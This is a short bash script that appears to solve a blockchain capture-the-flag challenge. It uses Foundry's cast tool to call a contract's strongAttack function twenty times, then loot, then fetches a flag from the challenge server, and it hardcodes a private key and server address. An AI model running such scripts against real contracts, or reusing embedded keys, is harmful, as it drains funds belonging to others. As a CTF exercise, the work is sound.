#!/bin/bash

target_adress=0x0cE6FDF176e76B287b1B22FcC24E0a4a4DdB3FE9
private_key=0xdbcef11a58213e62451d140c64ba3fb7a715570a4ea9772d7eeab2d075ddbf12

cast call $target_adress "lifePoints()" --rpc-url http://167.172.62.51:31520/rpc

for ((i=0; i<20; i++)); do
    cast send $target_adress "strongAttack(uint256)" 1 --rpc-url http://167.172.62.51:31520/rpc --private-key $private_key
    cast call $target_adress "lifePoints()" --rpc-url http://167.172.62.51:31520/rpc
done

cast send $target_adress "loot()" --rpc-url http://167.172.62.51:31520/rpc --private-key $private_key

curl -s "http://167.172.62.51:31520/flag"
echo 